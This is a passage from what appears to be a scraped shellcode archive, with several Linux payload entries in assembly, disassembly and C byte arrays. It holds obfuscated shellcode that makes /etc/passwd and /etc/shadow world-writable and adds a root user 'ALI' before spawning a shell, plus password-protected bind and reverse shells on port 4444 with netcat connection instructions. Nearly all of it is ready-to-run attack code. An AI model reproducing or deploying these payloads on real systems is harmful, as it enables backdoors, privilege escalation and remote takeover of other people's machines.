73 68 61       \tpush   $0x6168732f", "  3d:\t68 2f 65 74 63       \tpush   $0x6374652f", "  42:\t89 e3                \tmov    %esp,%ebx", "  44:\t68 41 41 ff 01       \tpush   $0x1ff4141", "  49:\t59                   \tpop    %ecx", "  4a:\tc1 e9 08             \tshr    $0x8,%ecx", "  4d:\tc1 e9 08             \tshr    $0x8,%ecx", "  50:\tcd 80                \tint    $0x80", "  52:\t6a 05                \tpush   $0x5", "  54:\t58                   \tpop    %eax", "  55:\t68 41 73 77 64       \tpush   $0x64777341", "  5a:\t5b                   \tpop    %ebx", "  5b:\tc1 eb 08             \tshr    $0x8,%ebx", "  5e:\t53                   \tpush   %ebx", "  5f:\t68 2f 70 61 73       \tpush   $0x7361702f", "  64:\t68 2f 65 74 63       \tpush   $0x6374652f", "  69:\t89 e3                \tmov    %esp,%ebx", "  6b:\t68 41 41 01 04       \tpush   $0x4014141", "  70:\t59                   \tpop    %ecx", "  71:\tc1 e9 08             \tshr    $0x8,%ecx", "  74:\tc1 e9 08             \tshr    $0x8,%ecx", "  77:\tcd 80                \tint    $0x80", "  79:\t89 c3                \tmov    %eax,%ebx", "  7b:\t6a 04                \tpush   $0x4", "  7d:\t58                   \tpop    %eax", "  7e:\t68 41 73 68 0a       \tpush   $0xa687341", "  83:\t59                   \tpop    %ecx", "  84:\tc1 e9 08             \tshr    $0x8,%ecx", "  87:\t51                   \tpush   %ecx", "  88:\t68 6e 2f 62 61       \tpush   $0x61622f6e", "  8d:\t68 3a 2f 62 69       \tpush   $0x69622f3a", "  92:\t68 72 6f 6f 74       \tpush   $0x746f6f72", "  97:\t68 4c 49 3a 2f       \tpush   $0x2f3a494c", "  9c:\t68 3a 30 3a 41       \tpush   $0x413a303a", "  a1:\t68 4b 2e 3a 30       \tpush   $0x303a2e4b", "  a6:\t68 66 77 55 57       \tpush   $0x57557766", "  ab:\t68 68 70 31 50       \tpush   $0x50317068", "  b0:\t68 7a 59 65 41       \tpush   $0x4165597a", "  b5:\t68 41 61 41 51       \tpush   $0x51416141", "  ba:\t68 49 38 75 74       \tpush   $0x74753849", "  bf:\t68 50 4d 59 68       \tpush   $0x68594d50", "  c4:\t68 54 42 74 7a       \tpush   $0x7a744254", "  c9:\t68 51 2f 38 54       \tpush   $0x54382f51", "  ce:\t68 45 36 6d 67       \tpush   $0x676d3645", "  d3:\t68 76 50 2e 73       \tpush   $0x732e5076", "  d8:\t68 4e 58 52 37       \tpush   $0x3752584e", "  dd:\t68 39 4b 55 48       \tpush   $0x48554b39", "  e2:\t68 72 2f 59 42       \tpush   $0x42592f72", "  e7:\t68 56 78 4b 47       \tpush   $0x474b7856", "  ec:\t68 39 55 66 5a       \tpush   $0x5a665539", "  f1:\t68 46 56 6a 68       \tpush   $0x686a5646", "  f6:\t68 46 63 38 79       \tpush   $0x79386346", "  fb:\t68 70 59 6a 71       \tpush   $0x716a5970", " 100:\t68 77 69 53 68       \tpush   $0x68536977", " 105:\t68 6e 54 67 54       \tpush   $0x5467546e", " 10a:\t68 58 4d 69 37       \tpush   $0x37694d58", " 10f:\t68 2f 41 6e 24       \tpush   $0x246e412f", " 114:\t68 70 55 6e 4d       \tpush   $0x4d6e5570", " 119:\t68 24 36 24 6a       \tpush   $0x6a243624", " 11e:\t68 41 4c 49 3a       \tpush   $0x3a494c41", " 123:\t89 e1                \tmov    %esp,%ecx", " 125:\tba 41 41 41 7f       \tmov    $0x7f414141,%edx", " 12a:\tc1 ea 08             \tshr    $0x8,%edx", " 12d:\tc1 ea 08             \tshr    $0x8,%edx", " 130:\tc1 ea 08             \tshr    $0x8,%edx", " 133:\tcd 80                \tint    $0x80", " 135:\t31 c0                \txor    %eax,%eax", " 137:\tb0 46                \tmov    $0x46,%al", " 139:\t31 db                \txor    %ebx,%ebx", " 13b:\t31 c9                \txor    %ecx,%ecx", " 13d:\tcd 80                \tint    $0x80", " 13f:\t31 c0                \txor    %eax,%eax", " 141:\tb0 46                \tmov    $0x46,%al", " 143:\t31 db                \txor    %ebx,%ebx", " 145:\t31 c9                \txor    %ecx,%ecx", " 147:\tcd 80                \tint    $0x80", " 149:\t68 59 59 59 59       \tpush   $0x59595959", " 14e:\t68 58 58 58 58       \tpush   $0x58585858", " 153:\t68 2f 73 68 42       \tpush   $0x4268732f", " 158:\t68 2f 62 69 6e       \tpush   $0x6e69622f", " 15d:\t89 e3                \tmov    %esp,%ebx", " 15f:\t31 c0                \txor    %eax,%eax", " 161:\t88 43 07             \tmov    %al,0x7(%ebx)", " 164:\t89 5b 08             \tmov    %ebx,0x8(%ebx)", " 167:\t89 43 0c             \tmov    %eax,0xc(%ebx)", " 16a:\tb0 0b                \tmov    $0xb,%al", " 16c:\t8d 4b 08             \tlea    0x8(%ebx),%ecx", " 16f:\t8d 53 0c             \tlea    0xc(%ebx),%edx", " 172:\tcd 80                \tint    $0x80", " 174:\tb0 01                \tmov    $0x1,%al", " 176:\tb3 01                \tmov    $0x1,%bl", " 178:\tcd 80                \tint    $0x80", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "char sc[] = \"\\x31\\xc0\\x31\\xdb\\x6a\\x0f\\x58\\x68\\x6a\\x73\\x77\\x64\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x70\\x61\\x73\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x68\\x41\\x41\\xff\\x01\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\xcd\\x80\\x6a\\x0f\\x58\\x68\\x6a\\x64\\x6f\\x77\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x73\\x68\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x68\\x41\\x41\\xff\\x01\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\xcd\\x80\\x6a\\x05\\x58\\x68\\x41\\x73\\x77\\x64\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x70\\x61\\x73\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x68\\x41\\x41\\x01\\x04\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x68\\x41\\x73\\x68\\x0a\\x59\\xc1\\xe9\\x08\\x51\\x68\\x6e\\x2f\\x62\\x61\\x68\\x3a\\x2f\\x62\\x69\\x68\\x72\\x6f\\x6f\\x74\\x68\\x4c\\x49\\x3a\\x2f\\x68\\x3a\\x30\\x3a\\x41\\x68\\x4b\\x2e\\x3a\\x30\\x68\\x66\\x77\\x55\\x57\\x68\\x68\\x70\\x31\\x50\\x68\\x7a\\x59\\x65\\x41\\x68\\x41\\x61\\x41\\x51\\x68\\x49\\x38\\x75\\x74\\x68\\x50\\x4d\\x59\\x68\\x68\\x54\\x42\\x74\\x7a\\x68\\x51\\x2f\\x38\\x54\\x68\\x45\\x36\\x6d\\x67\\x68\\x76\\x50\\x2e\\x73\\x68\\x4e\\x58\\x52\\x37\\x68\\x39\\x4b\\x55\\x48\\x68\\x72\\x2f\\x59\\x42\\x68\\x56\\x78\\x4b\\x47\\x68\\x39\\x55\\x66\\x5a\\x68\\x46\\x56\\x6a\\x68\\x68\\x46\\x63\\x38\\x79\\x68\\x70\\x59\\x6a\\x71\\x68\\x77\\x69\\x53\\x68\\x68\\x6e\\x54\\x67\\x54\\x68\\x58\\x4d\\x69\\x37\\x68\\x2f\\x41\\x6e\\x24\\x68\\x70\\x55\\x6e\\x4d\\x68\\x24\\x36\\x24\\x6a\\x68\\x41\\x4c\\x49\\x3a\\x89\\xe1\\xba\\x41\\x41\\x41\\x7f\\xc1\\xea\\x08\\xc1\\xea\\x08\\xc1\\xea\\x08\\xcd\\x80\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x68\\x59\\x59\\x59\\x59\\x68\\x58\\x58\\x58\\x58\\x68\\x2f\\x73\\x68\\x42\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xb0\\x01\\xb3\\x01\\xcd\\x80\";", "int main(void)", "{", "", "    fprintf(stdout,\"Length: %d\\n\\n\",strlen(sc));", "", "    (*(void(*)()) sc)();", "", "}"]},
{"Title": "Linux/x64 - Bind (4444/TCP) Shell (/bin/sh) + Password (hell) Shellcode (147 bytes)", "Author": "Keyman", "Published": ": 2014-09-03", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-889.php", "View": null, "code": ["; ===================================================================", "; Password Protected Bind Shell", "; Author: SLAE64-1351 (Keyman)", "; Date: 03/09/2014", ";", "; Shellcode length:  147 bytes", ";", "; Description:", ";", ";    Simple bind shell (listens on port 4444 by default) with 4 bytes", ";    password protection. Using a 4 bytes long password is still", ";    reasonably strong for a single-shot connection and keeps the", ";    code shorter.", ";", ";    To change the port or the password just modify the values of the", ";    exp_port and exp_pass \"variables\" below.", ";", ";    After the code gets executed connect to the newly opened port:", ";   ", ";    nc <IP address> <port number>", ";", ";    There is no password prompt. Type in the 4 bytes long password", ";    and hit enter. If the password matches, you are ready to type", ";    OS commands.", ";", "; ===================================================================", " ", "global _start", "section .text", " ", "; -------------------------------------------------------------------", "; Preprocessor directives so you can easily change the port and the", "; password.", "; -------------------------------------------------------------------", " ", "; Port number to listen on.", "%define exp_port        0x5c11          ; 4444", " ", "; Password to use.", "%define exp_pass        0x6c6c6568      ; hell", " ", "; -------------------------------------------------------------------", "; DO NOT TOUCH", "; preprocessor directives so syscalls can be easily referenced", "; -------------------------------------------------------------------", " ", "%define sys_bind    49", "%define sys_listen  50", "%define sys_accept  43", "%define sys_execve  59", "%define sys_dup2    33", " ", "_start:", " ", "    ; ---------------------------------------------------------------", "    ; START: create socket", "    ; ---------------------------------------------------------------", "      xor rax, rax", "      push rax              ; saving for sockaddr", "      push rax                          ; struct", "      push rax              ; clear rax later", "      push rax              ; set rdx to 0", "      pop rdx               ; protocol", "      mov al, 2", "      push rax", "      push rax", "      pop rsi", "      pop rdi               ; PF_INET", "      shr rsi, 1            ; SOCK_STREAM", "      add al, 39            ; socket syscall (41)", "      syscall", " ", "    ; ---------------------------------------------------------------", " ", "      push rax              ; store sockfd as first", "      pop rdi               ; argument of bind", " ", "    ; ---------------------------------------------------------------", "    ; START: create struct", "    ;", "    ; srv_addr.sin_family = AF_INET;", "    ; srv_addr.sin_addr.s_addr = INADDR_ANY;", "    ; srv_addr.sin_port = htons(portno);", "    ;", "    ; This is how it looks like on the stack (port is 4444):", "    ;", "    ; 0x02   0x00   0x11   0x5c   0x00   0x00   0x00   0x00", "    ; 0x00   0x00   0x00   0x00   0x00   0x00   0x00   0x00", "    ; ---------------------------------------------------------------", "      pop rax               ; clear rax so can be", "                                        ; used for syscall Nr.", "      mov byte [rsp], 2         ; set values", "      mov word [rsp+2], exp_port", "      push rsp", "      pop rsi               ; addr of struct in rsi", " ", "    ; ---------------------------------------------------------------", "    ; bind socket", "    ; ---------------------------------------------------------------", " ", "      push rax", "      pop rdx", "      add dl, 16            ; socklen_t addrlen", "      add al, sys_bind          ; syscall number", "      syscall", " ", "    ; ---------------------------------------------------------------", "    ; listen", "    ; ---------------------------------------------------------------", " ", "    ; rdi should still hold the socket descriptor so we don't", "    ; have to set it again", " ", "      ; We can save a 'xor rax, rax' here.", "      ; If success, 0 is returned by bind, we will have the rax reg.", "      ; cleared.", " ", "      push 2", "      pop rsi", "      add al, sys_listen", "      syscall", " ", "    ; ---------------------------------------------------------------", "    ; accept", "    ; ---------------------------------------------------------------", " ", "    ; rdi should still hold the socket descriptor so we don't", "    ; have to set it again", " ", "      ; We can save a 'xor rax, rax' here.", "      ; If success, 0 is returned by listen, we will have the rax reg.", "      ; cleared.", " ", "      push rax", "      pop rdx", "      push rax", "      pop rsi", "      add al, sys_accept", "      syscall", " ", "    ; at this point rax contains the new socket descriptor", " ", "      push rax              ; save new sockfd", "      push rax              ;", "      pop rdi               ; first argument for", "                    ; read()", "      pop r15               ; save for later", " ", "    ; ---------------------------------------------------------------", "    ; get passwd", "    ;", "    ; We will work with a 4 byte password, should be more than", "    ; enough as no brute forcing is possible. Chances to guess", "    ; the right value is 0.  Of course passwd should not contain", "    ; null bytes.", "    ;", "    ; n = read(newsockfd,buffer,4);", "    ; ---------------------------------------------------------------", " ", "      xor rax, rax          ; read() is syscall Nr. 0", "      push rax              ; buffer filled with 0s", "      push rsp              ; setup pointer to buf", "      pop rsi", "      add rdx, 4", "      syscall", " ", "      ; compare pass received with valid pass and exit if no match", " ", "      xor rcx, rcx", "      inc rcx", "      push rsp", "      pop rdi", "      push exp_pass", "      push rsp", "      pop rsi", "      cmpsq", "      jne passfail          ; passwd match, give shell", " ", "shell:", "    ; ---------------------------------------------------------------", "    ; 6. exec shell", "    ; ---------------------------------------------------------------", " ", "      add cl, 2", "      mov rdi, r15", "dup_loop:", "      push rcx              ; have to save rcx as dup2", "                    ; changes it's value", "      xor rax, rax", "      sub rcx, 1", "      push rcx", "      pop rsi", "      add al, sys_dup2", "      syscall", "      pop rcx               ; restore the counter", "      loop dup_loop", " ", "      jmp mytext", " ", "code:", "    pop rdi", "    mov [rdi+7], BYTE al", "    push rax", "    push rax", "    pop rsi", "    pop rdx", "    add al, sys_execve", "    syscall", " ", "mytext:", "    call code", "    MyText: db '/bin/sh', 0x41", " ", "passfail:"]},
{"Title": "Linux/x64 - Reverse (127.0.0.1:4444/TCP) Shell (/bin/sh) + Password (hell) Shellcode (136 bytes)", "Author": "Keyman", "Published": ": 2014-09-04", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-890.php", "View": null, "code": ["; ===================================================================", "; Password Protected Reverse Shell", "; Author: SLAE64-1351 (Keyman)", "; Date: 04/09/2014", ";", "; Shellcode length:  136 bytes", ";", "; Description:", ";", ";    Simple reverse shell (listens on port 4444 by default) with", ";    bytes password protection. Using a 4 bytes long password is", ";    still reasonably strong for a single-shot connection and keeps", ";    the code shorter.", ";", ";    To change the port or the password just modify the values of the", ";    exp_port and exp_pass \"variables\" below.", ";", ";    Before the code gets executed make sure to create a listener:", ";   ", ";    nc -lvp <port number>", ";", ";    After you receive the connection you will see no password", ";    prompt. Just type in the 4 bytes long password and hit enter.", ";    If the password matches, you are ready to type OS commands.", ";", "; ===================================================================", " ", "global _start", "section .text", " ", "; -------------------------------------------------------------------", "; Preprocessor directives so you can easily change the port and the", "; password.", "; -------------------------------------------------------------------", " ", "; Host to connect to. Please note that this value will have", "; 0x02020202 added to it, this way avoiding the NULL bytes.", " ", "%define exp_host    0xFEFDFE7D      ; 127.0.0.1", " ", "; Port number to listen on.", "%define exp_port        0x5c11          ; 4444", " ", "; Password to use. Make sure it's not longer than 4 bytes.", "%define exp_pass        0x6c6c6568      ; hell", " ", "; -------------------------------------------------------------------", "; DO NOT TOUCH", "; preprocessor directives so syscalls can be easily referenced", "; -------------------------------------------------------------------", " ", "%define sys_connect 42", "%define sys_read     0", "%define sys_execve  59", "%define sys_dup2    33", " ", "_start:", " ", "    ; ---------------------------------------------------------------", "    ; START: create socket", "    ; ---------------------------------------------------------------", "      xor rax, rax", "      push rax              ; saving for sockaddr", "      push rax                          ; struct", "      push rax              ; clear rax later", "      push rax              ; set rdx to 0", "      pop rdx               ; protocol", "      mov al, 2", "      push rax", "      push rax", "      pop rsi", "      pop rdi               ; PF_INET", "      shr rsi, 1            ; SOCK_STREAM", "      add al, 39            ; socket syscall (41)", "      syscall", " ", "    ; ---------------------------------------------------------------", "    ; START: create struct", "    ;", "    ; srv_addr.sin_family = AF_INET;", "    ; srv_addr.sin_addr.s_addr = INADDR_ANY;", "    ; srv_addr.sin_port = htons(portno);", "    ;", "    ; This is how it looks like on the stack:", "    ; 0x02    0x00    0x11    0x5c    0x7f    0x00    0x00    0x01", "    ; 0x20    0x00    0x00    0x00    0x00    0x00    0x00    0x00", "    ; ---------------------------------------------------------------", " ", "      ; TODO: have to make this shorter somehow", "      mov byte [rsp], 2                 ; set values", "      mov word [rsp+2], exp_port", "      mov dword [rsp+4], exp_host", "      add dword [rsp+4], 0x02020202", "      push rsp", "      pop rsi                           ; addr of struct in rsi", " ", "    ; ---------------------------------------------------------------", "    ; START: connect", "    ; ---------------------------------------------------------------", " ", "                    ; rdx is still 0", "      push rax              ; socket fd", "      pop rdi", "      add dl, 16", "      mov al, sys_connect", "      syscall", " ", "    ; ---------------------------------------------------------------", "    ; get passwd", "    ;", "    ; We will work with a 4 byte password, should be more than", "    ; enough as no brute forcing is possible. Chances to guess", "    ; the right value is 0.  Of course passwd should not contain", "    ; null bytes.", "    ;", "    ; n = read(newsockfd,buffer,4);", "    ; ---------------------------------------------------------------", " ", "      push rax              ; buffer filled with 0s", "      push rsp              ; setup pointer to buf", "      pop rsi", "      sub rdx, 12           ; set bytes to read (4)", "      syscall", " ", "      ; compare pass received with valid pass and exit if no match", " ", "      push rax", "      pop rcx", " ", "      push rdi              ; save socket", "      pop rax", " ", "      sub rcx, 3            ; read only once", "      push rsp", "      pop rdi", "      push exp_pass", "      push rsp", "      pop rsi", "      cmpsq", "      jne passfail          ; passwd match, give shell", " ", "shell:", "    ; ---------------------------------------------------------------", "    ; 6. exec shell", "    ; ---------------------------------------------------------------", " ", "      add cl, 2             ; rcx is 1, so add 2 = 3", "      push rax              ; restore socket", "      pop rdi", "dup_loop:", "      push rcx              ; have to save rcx as dup2", "                    ; changes it's value", "      xor rax, rax", "      sub rcx, 1", "      push rcx", "      pop rsi", "      add al, sys_dup2", "      syscall", "      pop rcx               ; restore the counter", "      loop dup_loop", " ", "      jmp mytext", " ", "code:", "      pop rdi", "      mov [rdi+7], BYTE al", "      push rax", "      pop rdx", "      add al, sys_execve", "      syscall", " ", "mytext:", "    call code", "    MyText: db '/bin/sh', 0x41", " ", "passfail:"]},
{"Title": "Linux/x86 - chmod 777 (/etc/passwd + /etc/shadow) + Add Root User (ALI/ALI) To /etc/passwd + setreuid + Execute /bin/bash Obfuscated Shellcode (521 bytes)", "Author": "Ali Razmjoo", "Published": ": 2014-09-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-887.php", "View": null, "code": ["/*", "#Title: Obfuscated Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Setreuid() , Execute /bin/sh ", "#length: 521 bytes", "#Date: 8 September  2018", "#Author: Ali Razmjoo", "#tested On: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]", "", "", "", "Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com", "Thanks to Jonathan Salwan", "", "", "chmod('/etc/passwd',777)", "chmod('/etc/shadow',777)", "open passwd , and write new root user with passwrd ( user: ALI pass: ALI ) , close passwd", "setreuid() , execve('/bin/sh')", "", "", "root@user:~/Desktop/xpl# objdump -d f.o", "", "f.o:     file format elf32-i386", "", "", "Disassembly of section .text:", "", "00000000 <_start>:", "   0:   31 c0                   xor    %eax,%eax", "   2:   31 db                   xor    %ebx,%ebx", "   4:   31 c9                   xor    %ecx,%ecx", "   6:   31 d2                   xor    %edx,%edx", "   8:   bb 59 45 4f 53          mov    $0x534f4559,%ebx", "   d:   ba 33 36 38 37          mov    $0x37383633,%edx", "  12:   31 d3                   xor    %edx,%ebx", "  14:   53                      push   %ebx", "  15:   c1 eb 08                shr    $0x8,%ebx", "  18:   53                      push   %ebx", "  19:   bb 7a 46 59 45          mov    $0x4559467a,%ebx", "  1e:   ba 55 36 38 36          mov    $0x36383655,%edx", "  23:   31 d3                   xor    %edx,%ebx", "  25:   53                      push   %ebx", "  26:   bb 67 58 45 4e          mov    $0x4e455867,%ebx", "  2b:   ba 48 3d 31 2d          mov    $0x2d313d48,%edx", "  30:   31 d3                   xor    %edx,%ebx", "  32:   53                      push   %ebx", "  33:   89 e3                   mov    %esp,%ebx", "  35:   68 41 41 ff 01          push   $0x1ff4141", "  3a:   59                      pop    %ecx", "  3b:   c1 e9 08                shr    $0x8,%ecx", "  3e:   c1 e9 08                shr    $0x8,%ecx", "  41:   6a 0f                   push   $0xf", "  43:   58                      pop    %eax", "  44:   cd 80                   int    $0x80", "  46:   bb 53 49 57 4a          mov    $0x4a574953,%ebx", "  4b:   ba 39 2d 38 3d          mov    $0x3d382d39,%edx", "  50:   31 d3                   xor    %edx,%ebx", "  52:   c1 eb 08                shr    $0x8,%ebx", "  55:   53                      push   %ebx", "  56:   bb 6d 47 45 58          mov    $0x5845476d,%ebx", "  5b:   ba 42 34 2d 39          mov    $0x392d3442,%edx", "  60:   31 d3                   xor    %edx,%ebx", "  62:   53                      push   %ebx", "  63:   bb 6e 54 49 57          mov    $0x5749546e,%ebx", "  68:   ba 41 31 3d 34          mov    $0x343d3141,%edx", "  6d:   31 d3                   xor    %edx,%ebx", "  6f:   53                      push   %ebx", "  70:   89 e3                   mov    %esp,%ebx", "  72:   68 41 41 ff 01          push   $0x1ff4141", "  77:   59                      pop    %ecx", "  78:   c1 e9 08                shr    $0x8,%ecx", "  7b:   c1 e9 08                shr    $0x8,%ecx", "  7e:   6a 0f                   push   $0xf", "  80:   58                      pop    %eax", "  81:   cd 80                   int    $0x80", "  83:   bb 73 47 4e 51          mov    $0x514e4773,%ebx", "  88:   ba 32 34 39 35          mov    $0x35393432,%edx", "  8d:   31 d3                   xor    %edx,%ebx", "  8f:   c1 eb 08                shr    $0x8,%ebx", "  92:   53                      push   %ebx", "  93:   bb 59 44 56 44          mov    $0x44564459,%ebx", "  98:   ba 76 34 37 37          mov    $0x37373476,%edx", "  9d:   31 d3                   xor    %edx,%ebx", "  9f:   53                      push   %ebx", "  a0:   bb 4e 58 59 51          mov    $0x5159584e,%ebx", "  a5:   ba 61 3d 2d 32          mov    $0x322d3d61,%edx", "  aa:   31 d3                   xor    %edx,%ebx", "  ac:   53                      push   %ebx", "  ad:   89 e3                   mov    %esp,%ebx", "  af:   68 41 41 01 04          push   $0x4014141", "  b4:   59                      pop    %ecx", "  b5:   c1 e9 08                shr    $0x8,%ecx", "  b8:   c1 e9 08                shr    $0x8,%ecx", "  bb:   6a 05                   push   $0x5", "  bd:   58                      pop    %eax", "  be:   cd 80                   int    $0x80", "  c0:   89 c3                   mov    %eax,%ebx", "  c2:   6a 04                   push   $0x4", "  c4:   58                      pop    %eax", "  c5:   68 41 73 68 0a          push   $0xa687341", "  ca:   59                      pop    %ecx", "  cb:   c1 e9 08                shr    $0x8,%ecx", "  ce:   51                      push   %ecx", "  cf:   b9 57 67 57 58          mov    $0x58576757,%ecx", "  d4:   ba 39 48 35 39          mov    $0x39354839,%edx", "  d9:   31 d1                   xor    %edx,%ecx", "  db:   51                      push   %ecx", "  dc:   b9 4e 64 5a 51          mov    $0x515a644e,%ecx", "  e1:   ba 74 4b 38 38          mov    $0x38384b74,%edx", "  e6:   31 d1                   xor    %edx,%ecx", "  e8:   51                      push   %ecx", "  e9:   b9 47 57 56 42          mov    $0x42565747,%ecx", "  ee:   ba 35 38 39 36          mov    $0x36393835,%edx", "  f3:   31 d1                   xor    %edx,%ecx", "  f5:   51                      push   %ecx", "  f6:   b9 61 70 51 4e          mov    $0x4e517061,%ecx", "  fb:   ba 2d 39 6b 61          mov    $0x616b392d,%edx", " 100:   31 d1                   xor    %edx,%ecx", " 102:   51                      push   %ecx", " 103:   b9 48 58 70 74          mov    $0x74705848,%ecx", " 108:   ba 72 68 4a 35          mov    $0x354a6872,%edx", " 10d:   31 d1                   xor    %edx,%ecx", " 10f:   51                      push   %ecx", " 110:   b9 76 45 56 46          mov    $0x46564576,%ecx", " 115:   ba 3d 6b 6c 76          mov    $0x766c6b3d,%edx", " 11a:   31 d1                   xor    %edx,%ecx", " 11c:   51                      push   %ecx", " 11d:   68 66 77 55 57          push   $0x57557766", " 122:   68 68 70 31 50          push   $0x50317068", " 127:   68 7a 59 65 41          push   $0x4165597a", " 12c:   68 41 61 41 51          push   $0x51416141", " 131:   68 49 38 75 74          push   $0x74753849", " 136:   68 50 4d 59 68          push   $0x68594d50", " 13b:   68 54 42 74 7a          push   $0x7a744254", " 140:   68 51 2f 38 54          push   $0x54382f51", " 145:   68 45 36 6d 67          push   $0x676d3645", " 14a:   68 76 50 2e 73          push   $0x732e5076", " 14f:   68 4e 58 52 37          push   $0x3752584e", " 154:   68 39 4b 55 48          push   $0x48554b39", " 159:   68 72 2f 59 42          push   $0x42592f72", " 15e:   68 56 78 4b 47          push   $0x474b7856", " 163:   68 39 55 66 5a          push   $0x5a665539", " 168:   68 46 56 6a 68          push   $0x686a5646", " 16d:   68 46 63 38 79          push   $0x79386346", " 172:   68 70 59 6a 71          push   $0x716a5970", " 177:   68 77 69 53 68          push   $0x68536977", " 17c:   68 6e 54 67 54          push   $0x5467546e", " 181:   68 58 4d 69 37          push   $0x37694d58", " 186:   68 2f 41 6e 24          push   $0x246e412f", " 18b:   68 70 55 6e 4d          push   $0x4d6e5570", " 190:   68 24 36 24 6a          push   $0x6a243624", " 195:   b9 73 61 74 67          mov    $0x67746173,%ecx", " 19a:   ba 32 2d 3d 5d          mov    $0x5d3d2d32,%edx", " 19f:   31 d1                   xor    %edx,%ecx", " 1a1:   51                      push   %ecx", " 1a2:   89 e1                   mov    %esp,%ecx", " 1a4:   ba 41 41 41 7f          mov    $0x7f414141,%edx", " 1a9:   c1 ea 08                shr    $0x8,%edx", " 1ac:   c1 ea 08                shr    $0x8,%edx", " 1af:   c1 ea 08                shr    $0x8,%edx", " 1b2:   cd 80                   int    $0x80", " 1b4:   31 c0                   xor    %eax,%eax", " 1b6:   b0 46                   mov    $0x46,%al", " 1b8:   31 db                   xor    %ebx,%ebx", " 1ba:   31 c9                   xor    %ecx,%ecx", " 1bc:   cd 80                   int    $0x80", " 1be:   31 c0                   xor    %eax,%eax", " 1c0:   b0 46                   mov    $0x46,%al", " 1c2:   31 db                   xor    %ebx,%ebx", " 1c4:   31 c9                   xor    %ecx,%ecx", " 1c6:   cd 80                   int    $0x80", " 1c8:   68 52 55 48 42          push   $0x42485552", " 1cd:   68 52 51 49 43          push   $0x43495152", " 1d2:   b9 49 4b 59 77          mov    $0x77594b49,%ecx", " 1d7:   ba 66 38 31 35          mov    $0x35313866,%edx", " 1dc:   31 d1                   xor    %edx,%ecx", " 1de:   51                      push   %ecx", " 1df:   b9 55 55 54 57          mov    $0x57545555,%ecx", " 1e4:   ba 7a 37 3d 39          mov    $0x393d377a,%edx", " 1e9:   31 d1                   xor    %edx,%ecx", " 1eb:   51                      push   %ecx", " 1ec:   89 e3                   mov    %esp,%ebx", " 1ee:   31 c0                   xor    %eax,%eax", " 1f0:   88 43 07                mov    %al,0x7(%ebx)", " 1f3:   89 5b 08                mov    %ebx,0x8(%ebx)", " 1f6:   89 43 0c                mov    %eax,0xc(%ebx)", " 1f9:   b0 0b                   mov    $0xb,%al", " 1fb:   8d 4b 08                lea    0x8(%ebx),%ecx", " 1fe:   8d 53 0c                lea    0xc(%ebx),%edx", " 201:   cd 80                   int    $0x80", " 203:   b0 01                   mov    $0x1,%al", " 205:   b3 01                   mov    $0x1,%bl", " 207:   cd 80                   int    $0x80", "root@user:~/Desktop/xpl#", "", "", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "char sc[] = \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xbb\\x59\\x45\\x4f\\x53\\xba\\x33\\x36\\x38\\x37\\x31\\xd3\\x53\\xc1\\xeb\\x08\\x53\\xbb\\x7a\\x46\\x59\\x45\\xba\\x55\\x36\\x38\\x36\\x31\\xd3\\x53\\xbb\\x67\\x58\\x45\\x4e\\xba\\x48\\x3d\\x31\\x2d\\x31\\xd3\\x53\\x89\\xe3\\x68\\x41\\x41\\xff\\x01\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\x6a\\x0f\\x58\\xcd\\x80\\xbb\\x53\\x49\\x57\\x4a\\xba\\x39\\x2d\\x38\\x3d\\x31\\xd3\\xc1\\xeb\\x08\\x53\\xbb\\x6d\\x47\\x45\\x58\\xba\\x42\\x34\\x2d\\x39\\x31\\xd3\\x53\\xbb\\x6e\\x54\\x49\\x57\\xba\\x41\\x31\\x3d\\x34\\x31\\xd3\\x53\\x89\\xe3\\x68\\x41\\x41\\xff\\x01\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\x6a\\x0f\\x58\\xcd\\x80\\xbb\\x73\\x47\\x4e\\x51\\xba\\x32\\x34\\x39\\x35\\x31\\xd3\\xc1\\xeb\\x08\\x53\\xbb\\x59\\x44\\x56\\x44\\xba\\x76\\x34\\x37\\x37\\x31\\xd3\\x53\\xbb\\x4e\\x58\\x59\\x51\\xba\\x61\\x3d\\x2d\\x32\\x31\\xd3\\x53\\x89\\xe3\\x68\\x41\\x41\\x01\\x04\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\x6a\\x05\\x58\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x68\\x41\\x73\\x68\\x0a\\x59\\xc1\\xe9\\x08\\x51\\xb9\\x57\\x67\\x57\\x58\\xba\\x39\\x48\\x35\\x39\\x31\\xd1\\x51\\xb9\\x4e\\x64\\x5a\\x51\\xba\\x74\\x4b\\x38\\x38\\x31\\xd1\\x51\\xb9\\x47\\x57\\x56\\x42\\xba\\x35\\x38\\x39\\x36\\x31\\xd1\\x51\\xb9\\x61\\x70\\x51\\x4e\\xba\\x2d\\x39\\x6b\\x61\\x31\\xd1